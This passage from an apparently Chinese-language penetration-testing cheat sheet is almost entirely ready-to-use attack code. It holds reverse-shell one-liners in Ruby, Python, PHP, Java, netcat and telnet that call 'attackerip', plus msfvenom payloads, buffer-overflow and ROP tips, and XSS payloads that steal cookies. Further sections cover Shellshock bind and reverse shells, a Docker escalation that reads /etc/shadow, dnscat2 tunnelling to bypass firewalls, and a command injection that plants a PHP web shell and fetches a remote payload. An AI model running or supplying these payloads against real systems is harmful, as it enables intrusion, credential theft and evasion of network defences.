class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div><div class="line"></div><div class="line"># Win 平台</div><div class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div><div class="line">ruby -rsocket -e &apos;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></div></div></figure><h3 id="PYTHON-反弹-Shell"><a href="#PYTHON-反弹-Shell" class="headerlink" title="PYTHON 反弹 Shell"></a>PYTHON 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></div></div></figure><h3 id="PHP-反弹-Shell"><a href="#PHP-反弹-Shell" class="headerlink" title="PHP 反弹 Shell"></a>PHP 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></div></div></figure><h3 id="JAVA-反弹-Shell"><a href="#JAVA-反弹-Shell" class="headerlink" title="JAVA 反弹 Shell"></a>JAVA 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div></pre></div></div></figure><h3 id="NETCAT-反弹-Shell"><a href="#NETCAT-反弹-Shell" class="headerlink" title="NETCAT 反弹 Shell"></a>NETCAT 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">nc -e /bin/sh attackerip 4444</div><div class="line">nc -e /bin/sh 192.168.37.10 443</div><div class="line"></div><div class="line"># 如果 -e 参数被禁用，可以尝试以下命令</div><div class="line"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</div><div class="line">/bin/sh | nc attackerip 443</div><div class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/</div><div class="line"></div><div class="line"># 如果你安装错了 netcat 的版本，请尝试以下命令</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f</div></pre></div></div></figure><h3 id="TELNET-反弹-Shell"><a href="#TELNET-反弹-Shell" class="headerlink" title="TELNET 反弹 Shell"></a>TELNET 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"># 如果 netcat 不可用或者 /dev/tcp</div><div class="line">mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></div></div></figure><h3 id="XTERM-反弹-Shell"><a href="#XTERM-反弹-Shell" class="headerlink" title="XTERM 反弹 Shell"></a>XTERM 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"># http://baike.baidu.com/view/418628.htm</div><div class="line"># 开启 X 服务器 (:1 – 监听 TCP 端口 6001)</div><div class="line">apt-get install xnest</div><div class="line">Xnest :1</div><div class="line"></div><div class="line"># 记得授权来自目标 IP 的连接</div><div class="line">xterm -display 127.0.0.1:1</div><div class="line"></div><div class="line"># 授权访问</div><div class="line">xhost +targetip</div><div class="line"></div><div class="line"># 在目标机器上连接回我们的 X 服务器</div><div class="line">xterm -display attackerip:1</div><div class="line">/usr/openwin/bin/xterm -display attackerip:1</div><div class="line">or</div><div class="line">$ DISPLAY=attackerip:0 xterm</div></pre></div></div></figure><h3 id="Windows-缓冲区溢出利用命令"><a href="#Windows-缓冲区溢出利用命令" class="headerlink" title="Windows 缓冲区溢出利用命令"></a>Windows 缓冲区溢出利用命令</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f c</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f c</div></pre></div></div></figure><h3 id="COMMONLY-USED-BAD-CHARACTERS"><a href="#COMMONLY-USED-BAD-CHARACTERS" class="headerlink" title="COMMONLY USED BAD CHARACTERS:"></a>COMMONLY USED BAD CHARACTERS:</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></div><div class="code"><pre><div class="line">\x00\x0a\x0d\x20                              For http request</div><div class="line">\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</div><div class="line"></div><div class="line"># 常用命令:</div><div class="line">pattern create</div><div class="line">pattern offset (EIP Address)</div><div class="line">pattern offset (ESP Address)</div><div class="line">add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )</div><div class="line"></div><div class="line">!pvefindaddr pattern_create 5000</div><div class="line">!pvefindaddr suggest</div><div class="line">!pvefindaddr modules</div><div class="line">!pvefindaddr nosafeseh</div><div class="line"></div><div class="line">!mona config -set workingfolder C:\Mona\%p</div><div class="line">!mona config -get workingfolder</div><div class="line">!mona mod</div><div class="line">!mona bytearray -b &quot;\x00\x0a&quot;</div><div class="line">!mona pc 5000</div><div class="line">!mona po EIP</div><div class="line">!mona suggest</div></pre></div></div></figure><h2 id="SEH-–-结构化异常处理"><a href="#SEH-–-结构化异常处理" class="headerlink" title="SEH – 结构化异常处理"></a>SEH – 结构化异常处理</h2><blockquote><p>SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。<br><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line"># https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</div><div class="line"># http://baike.baidu.com/view/243131.htm</div><div class="line">!mona suggest</div><div class="line">!mona nosafeseh</div><div class="line">nseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)</div><div class="line">iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)</div></pre></div></div></figure></p></blockquote><h2 id="ROP-DEP"><a href="#ROP-DEP" class="headerlink" title="ROP (DEP)"></a>ROP (DEP)</h2><blockquote><p>ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。</div><div class="line"></div><div class="line"># https://en.wikipedia.org/wiki/Return-oriented_programming</div><div class="line"># https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</div><div class="line"># https://en.wikipedia.org/wiki/Data_Execution_Prevention</div><div class="line"># http://baike.baidu.com/item/DEP/7694630</div><div class="line">!mona modules</div><div class="line">!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;</div><div class="line">!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest)</div></pre></div></div></figure><p>##ASLR – 地址空间格局随机化</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"># https://en.wikipedia.org/wiki/Address_space_layout_randomization</div><div class="line"># http://baike.baidu.com/view/3862310.htm</div></pre></div></div></figure><p>##寻蛋(EGG Hunter)技术</p><blockquote><p>Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</div><div class="line"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</div><div class="line"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</div><div class="line">!mona jmp -r esp</div><div class="line">!mona egg -t lxxl</div><div class="line">\xeb\xc4 (jump backward -60)</div><div class="line">buff=lxxllxxl+shell</div><div class="line">!mona egg -t &apos;w00t&apos;</div></pre></div></div></figure><h2 id="GDB-Debugger-常用命令"><a href="#GDB-Debugger-常用命令" class="headerlink" title="GDB Debugger 常用命令"></a>GDB Debugger 常用命令</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></div><div class="code"><pre><div class="line"># 设置断点</div><div class="line">break *_start</div><div class="line"></div><div class="line"># 执行下一个命令</div><div class="line">next</div><div class="line">step</div><div class="line">n</div><div class="line">s</div><div class="line"></div><div class="line"># 继续执行</div><div class="line">continue</div><div class="line">c</div><div class="line"></div><div class="line"># 数据</div><div class="line">checking &apos;REGISTERS&apos; and &apos;MEMORY&apos;</div><div class="line"></div><div class="line"># 显示寄存器的值: (Decimal,Binary,Hex)</div><div class="line">print /d –&gt; Decimal</div><div class="line">print /t –&gt; Binary</div><div class="line">print /x –&gt; Hex</div><div class="line">O/P :</div><div class="line">(gdb) print /d $eax</div><div class="line">$17 = 13</div><div class="line">(gdb) print /t $eax</div><div class="line">$18 = 1101</div><div class="line">(gdb) print /x $eax</div><div class="line">$19 = 0xd</div><div class="line">(gdb)</div><div class="line"></div><div class="line"># 显示特定内存地址的值</div><div class="line">command : x/nyz (Examine)</div><div class="line">n –&gt; Number of fields to display ==&gt;</div><div class="line">y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)</div><div class="line">z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)</div></pre></div></div></figure><h2 id="XSS-备忘录"><a href="#XSS-备忘录" class="headerlink" title="XSS 备忘录"></a>XSS 备忘录</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></div><div class="code"><pre><div class="line">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</div><div class="line">(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)</div><div class="line"></div><div class="line">&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;</div><div class="line"></div><div class="line">&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">&quot;;!–&quot;&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;</div><div class="line"></div><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div><div class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</div><div class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;</div><div class="line">&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</div><div class="line"></div><div class="line">&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;</div><div class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</div><div class="line"></div><div class="line">perl -e &apos;print &quot;&lt;IMG SRC=javascript:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</div><div class="line"></div><div class="line">&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</div><div class="line"></div><div class="line">(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)</div><div class="line"></div><div class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;</div><div class="line">&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">%253cscript%253ealert(document.cookie)%253c/script%253e</div><div class="line">&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&apos;%3E</div><div class="line">&lt;img src=asdf onerror=alert(document.cookie)&gt;</div></pre></div></div></figure><h2 id="SSH-Over-SCTP-使用-Socat"><a href="#SSH-Over-SCTP-使用-Socat" class="headerlink" title="SSH Over SCTP (使用 Socat)"></a>SSH Over SCTP (使用 Socat)</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line"># 远端服务器</div><div class="line"># 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP</div><div class="line">$ socat SCTP-LISTEN:80,fork TCP:localhost:22</div><div class="line"></div><div class="line"># 本地端</div><div class="line"># 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号</div><div class="line">$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80</div><div class="line"></div><div class="line"># 创建 socks 代理</div><div class="line"># 替换 username 和 -p 的端口号</div><div class="line">$ ssh -lusername localhost -D 8080 -p 1337</div></pre></div></div></figure><h2 id="使用洋葱网络"><a href="#使用洋葱网络" class="headerlink" title="使用洋葱网络"></a>使用洋葱网络</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line"># 安装服务</div><div class="line">$ apt-get install tor torsocks</div><div class="line"></div><div class="line"># 绑定 ssh 到 tor 服务端口 80</div><div class="line"># /etc/tor/torrc</div><div class="line">SocksPolicy accept 127.0.0.1</div><div class="line">SocksPolicy accept 192.168.0.0/16</div><div class="line">Log notice file /var/log/tor/notices.log</div><div class="line">RunAsDaemon 1</div><div class="line">HiddenServiceDir /var/lib/tor/ssh_hidden_service/</div><div class="line">HiddenServicePort 80 127.0.0.1:22</div><div class="line">PublishServerDescriptor 0</div><div class="line">$ /etc/init.d/tor start</div><div class="line">$ cat /var/lib/tor/ssh_hidden_service/hostname</div><div class="line">3l5zstvt1zk5jhl662.onion</div><div class="line"></div><div class="line"># ssh 客户端连接</div><div class="line">$ apt-get install torsocks</div><div class="line">$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80</div></pre></div></div></figure><h2 id="Metagoofil-–-元数据收集工具"><a href="#Metagoofil-–-元数据收集工具" class="headerlink" title="Metagoofil – 元数据收集工具"></a>Metagoofil – 元数据收集工具</h2><blockquote><p>Metagoofil 是一款利用Google收集信息的工具。</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"># http://www.edge-security.com/metagoofil.php</div><div class="line"># 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能</div><div class="line">$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html</div></pre></div></div></figure><h2 id="利用-Shellshock"><a href="#利用-Shellshock" class="headerlink" title="利用 Shellshock"></a>利用 Shellshock</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line"># 一个发现并利用服务器 Shellshock 的工具</div><div class="line"># https://github.com/nccgroup/shocker</div><div class="line">$ ./shocker.py -H 192.168.56.118  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</div><div class="line"></div><div class="line"># 查看文件</div><div class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div><div class="line"></div><div class="line"># 绑定 shell</div><div class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div><div class="line"></div><div class="line"># 反弹 Shell</div><div class="line">$ nc -l -p 443</div><div class="line">$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div></pre></div></div></figure><h2 id="获取-Docker-的-Root"><a href="#获取-Docker-的-Root" class="headerlink" title="获取 Docker 的 Root"></a>获取 Docker 的 Root</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></div><div class="code"><pre><div class="line"># 获取  Docker 的 Root</div><div class="line"># user 必须在 docker 用户组中</div><div class="line">ek@victum:~/docker-test$ id</div><div class="line">uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)</div><div class="line"></div><div class="line">ek@victum:~$ mkdir docker-test</div><div class="line">ek@victum:~$ cd docker-test</div><div class="line"></div><div class="line">ek@victum:~$ cat &gt; Dockerfile</div><div class="line">FROM debian:wheezy</div><div class="line"></div><div class="line">ENV WORKDIR /stuff</div><div class="line"></div><div class="line">RUN mkdir -p $WORKDIR</div><div class="line"></div><div class="line">VOLUME [ $WORKDIR ]</div><div class="line"></div><div class="line">WORKDIR $WORKDIR</div><div class="line">&lt;&lt; EOF</div><div class="line"></div><div class="line">ek@victum:~$ docker build -t my-docker-image .</div><div class="line">ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \</div><div class="line">&apos;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&apos;</div><div class="line">./sh</div><div class="line">whoami</div><div class="line"># root</div><div class="line"></div><div class="line">ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &apos;cat /stuff/shadow&apos;</div></pre></div></div></figure><h2 id="使用-DNS-隧道绕过防火墙"><a href="#使用-DNS-隧道绕过防火墙" class="headerlink" title="使用 DNS 隧道绕过防火墙"></a>使用 DNS 隧道绕过防火墙</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></div><div class="code"><pre><div class="line"># 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查</div><div class="line"># dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序</div><div class="line"></div><div class="line"># 服务器 (攻击者)</div><div class="line">$ apt-get update</div><div class="line">$ apt-get -y install ruby-dev git make g++</div><div class="line">$ gem install bundler</div><div class="line">$ git clone https://github.com/iagox86/dnscat2.git</div><div class="line">$ cd dnscat2/server</div><div class="line">$ bundle install</div><div class="line">$ ruby ./dnscat2.rb</div><div class="line">dnscat2&gt; New session established: 16059</div><div class="line">dnscat2&gt; session -i 16059</div><div class="line"></div><div class="line"># 客户机 (目标)</div><div class="line"># https://downloads.skullsecurity.org/dnscat2/</div><div class="line"># https://github.com/lukebaggett/dnscat2-powershell</div><div class="line">$ dnscat --host &lt;dnscat server_ip&gt;</div><div class="line">编译 Assemble 代码</div><div class="line"></div><div class="line">$ nasm -f elf32 simple32.asm -o simple32.o</div><div class="line">$ ld -m elf_i386 simple32.o simple32</div><div class="line"></div><div class="line">$ nasm -f elf64 simple.asm -o simple.o</div><div class="line">$ ld simple.o -o simple</div></pre></div></div></figure><h2 id="使用非交互-Shell-打入内网"><a href="#使用非交互-Shell-打入内网" class="headerlink" title="使用非交互 Shell 打入内网"></a>使用非交互 Shell 打入内网</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"># 生成 shell 使用的 ssh 密钥</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&quot;\&quot; &quot;</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;</div><div class="line"></div><div class="line"># 增加用户 tempuser </div><div class="line">$ useradd -m tempuser</div><div class="line">$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys</div><div class="line">$ chmod 700 /home/tempuser/.ssh/authorized_keys</div><div class="line">$ chown -R tempuser:tempuser /home/tempuser/.ssh</div><div class="line"></div><div class="line"># 反弹 ssh shell</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot;</div></pre></div></div></figure><h2 id="利用-POST-远程命令执行获取-Shell"><a href="#利用-POST-远程命令执行获取-Shell" class="headerlink" title="利用 POST 远程命令执行获取 Shell"></a>利用 POST 远程命令执行获取 Shell</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">attacker:~$ curl -i -s -k  -X &apos;POST&apos; --data-binary $&apos;IP=%3Bwhoami&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;</div><div class="line"></div><div class="line">attacker:~$ curl -i -s -k  -X &apos;POST&apos; --data-binary $&apos;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;</div><div class="line"></div><div class="line">attacker:~$ curl http://victum.tk/shell.php?cmd=id</div><div class="line"></div><div class="line"># 在服务器上下载 shell (phpshell.php)</div><div class="line"></div><div class="line">http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27</div><div class="line"></div><div class="line"># 运行 nc 并执行 phpshell.php</div><div class="line">attacker:~$ nc -nvlp 1337</div></pre></div></div></figure><h2 id="以管理员身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以管理员身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以管理员身份在 Win7 上反弹具有系统权限的 Shell"></a>以管理员身份在 Win7 上反弹具有系统权限的 Shell</h2><figure class="highlight plain"><div 